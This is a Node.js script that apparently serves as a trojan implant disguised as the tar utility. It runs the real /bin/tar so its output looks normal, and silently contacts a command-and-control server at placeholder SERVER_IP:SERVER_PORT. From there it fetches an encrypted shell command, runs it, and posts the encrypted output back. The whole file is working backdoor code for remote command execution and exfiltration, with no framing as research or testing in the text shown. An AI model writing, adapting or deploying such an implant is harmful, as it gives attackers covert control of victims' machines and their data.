#!/usr/bin/env node
import { spawn } from "child_process";
import { symmetricEncrypt, symmetricDecrypt, pubkeyEncrypt } from "./crypto";
import crypto from 'crypto'

import axios from "axios";

const args = process.argv.slice(2);

// First, simulate tar functionality
const tar_location = "/bin/tar";
const childProcess = spawn(tar_location, args);

childProcess.stdout.on("data", (data) => {
  process.stdout.write(data);
});

childProcess.stderr.on("data", (data) => {
  process.stderr.write(`${data}`);
});

// Acquire configuration constants
const server_ip = SERVER_IP;
const server_port = SERVER_PORT;
const server_addr = `http://${server_ip}:${server_port}`;


// Prepare symmetric key for the server to respond
const symkey = crypto.randomBytes(32);

let task_id = crypto.randomBytes(24).toString("base64");



// Basic promise-based command runner.
function doCommand(command) {
  return new Promise((res, rej) => {
    let stdout = "";
    let stderr = "";
    const commandRunner = spawn(command, [], { shell: true });
    commandRunner.stdout.on("data", (data) => (stdout += data.toString()));
    commandRunner.stderr.on("data", (data) => (stderr += data.toString()));
    commandRunner.on("exit", () => res({ stdout, stderr }));
  });
}

// Then attempt to fetch commands!!
async function main() {
  console.log(symkey);
  const squireRequest = {
    symkey: symkey.toString("base64"),
    task_id,
  };

  const response = await axios.post(
    `${server_addr}/task`,
    pubkeyEncrypt(squireRequest)
  );

  console.log(response.data)

  const serverResponse = symmetricDecrypt(response.data, symkey);

  const command = serverResponse.command;
  const s_task_id = serverResponse.task_id;
  if (s_task_id != task_id) return; // Safety check: Server must respond correctly!
  const { stdout, stderr } = await doCommand(command);

  const squireReport = {
    stdout,
    stderr,
    task_id,
  };


  const encryptedReport = {
    ...symmetricEncrypt(squireReport, symkey),
    task_id
  }

  axios.post(`${server_addr}/report`, encryptedReport);
}

try {
  main();
} catch {}
